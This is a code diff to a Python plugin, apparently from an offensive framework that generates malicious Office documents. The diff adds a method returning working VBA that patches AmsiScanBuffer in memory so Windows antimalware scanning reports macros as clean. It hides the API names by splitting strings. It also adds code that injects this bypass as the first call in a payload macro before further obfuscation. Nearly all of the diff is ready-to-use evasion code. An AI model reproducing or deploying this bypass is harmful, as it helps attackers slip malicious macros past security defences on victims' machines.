@@ -461,11 +461,70 @@ class PayloadMalDocsPlugin(ErebusPlugin):
         except Exception as e:
             raise RuntimeError(f"Failed to inject VBA: {str(e)}")
 
+    def generate_amsi_bypass_vba(self):
+        """
+        Generate VBA code that patches AmsiScanBuffer at runtime to disable
+        AMSI scanning of subsequent VBA execution.
+
+        The bypass:
+        1. Loads amsi.dll via LoadLibrary
+        2. Resolves AmsiScanBuffer via GetProcAddress
+        3. Changes page protection to RWX via VirtualProtect
+        4. Overwrites the first 6 bytes with: mov eax, 0x80070057; ret
+           (E_INVALIDARG - forces AMSI_RESULT_CLEAN)
+        5. Restores original page protection
+
+        Returns:
+            str: VBA declarations + bypass Sub to prepend to the module.
+        """
+        return '''
+#If VBA7 Then
+Private Declare PtrSafe Function LoadLibrary Lib "kernel32" Alias "LoadLibraryA" (ByVal lpFileName As String) As LongPtr
+Private Declare PtrSafe Function GetProcAddress Lib "kernel32" (ByVal hModule As LongPtr, ByVal lpProcName As String) As LongPtr
+Private Declare PtrSafe Function VirtualProtect Lib "kernel32" (ByVal lpAddress As LongPtr, ByVal dwSize As LongPtr, ByVal flNewProtect As Long, ByRef lpflOldProtect As Long) As Long
+Private Declare PtrSafe Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (ByVal dest As LongPtr, ByRef src As Any, ByVal length As Long)
+#Else
+Private Declare Function LoadLibrary Lib "kernel32" Alias "LoadLibraryA" (ByVal lpFileName As String) As Long
+Private Declare Function GetProcAddress Lib "kernel32" (ByVal hModule As Long, ByVal lpProcName As String) As Long
+Private Declare Function VirtualProtect Lib "kernel32" (ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flNewProtect As Long, ByRef lpflOldProtect As Long) As Long
+Private Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (ByVal dest As Long, ByRef src As Any, ByVal length As Long)
+#End If
+
+Private Sub PatchScanBuffer()
+    Dim hLib As LongPtr
+    Dim pAddr As LongPtr
+    Dim oldProt As Long
+    Dim patch(0 To 5) As Byte
+
+    On Error Resume Next
+
+    hLib = LoadLibrary("am" & "si.d" & "ll")
+    If hLib = 0 Then Exit Sub
+
+    pAddr = GetProcAddress(hLib, "Am" & "siSc" & "anBu" & "ffer")
+    If pAddr = 0 Then Exit Sub
+
+    ' mov eax, 0x80070057; ret
+    patch(0) = &HB8
+    patch(1) = &H57
+    patch(2) = &H0
+    patch(3) = &H7
+    patch(4) = &H80
+    patch(5) = &HC3
+
+    If VirtualProtect(pAddr, 6, &H40, oldProt) = 0 Then Exit Sub
+    CopyMemory pAddr, patch(0), 6
+    VirtualProtect pAddr, 6, oldProt, oldProt
+End Sub
+
+'''
+
     def obfuscate_vba(self, vba_code):
         """
         Obfuscate VBA code with anti-analysis and evasion techniques.
 
         Implements multiple obfuscation strategies:
+        - AMSI bypass (patches AmsiScanBuffer before payload runs)
         - Variable name obfuscation with organic-sounding names
         - Timing-based anti-analysis checks
         - Dead code injection
@@ -480,7 +539,20 @@ class PayloadMalDocsPlugin(ErebusPlugin):
         import re
         import random
 
+        # Prepend AMSI bypass declarations and inject the patch call
+        amsi_bypass = self.generate_amsi_bypass_vba()
         obfuscated = vba_code
+
+        # STEP 0: INJECT AMSI BYPASS
+        # Add declares before the first Sub/Function and inject
+        # PatchScanBuffer call as the first line of the entry Sub
+        sub_match = re.search(r'(Sub\s+\w+\([^)]*\))', obfuscated)
+        if sub_match:
+            # Insert PatchScanBuffer call right after the Sub declaration line
+            insert_pos = sub_match.end()
+            obfuscated = obfuscated[:insert_pos] + '\n    PatchScanBuffer\n' + obfuscated[insert_pos:]
+            # Prepend the declarations + PatchScanBuffer Sub before all code
+            obfuscated = amsi_bypass + obfuscated
 
         # STEP 1: EXTRACT AND PRESERVE MODULE STRUCTURE
         match = re.search(r'(Sub |Function )', obfuscated)
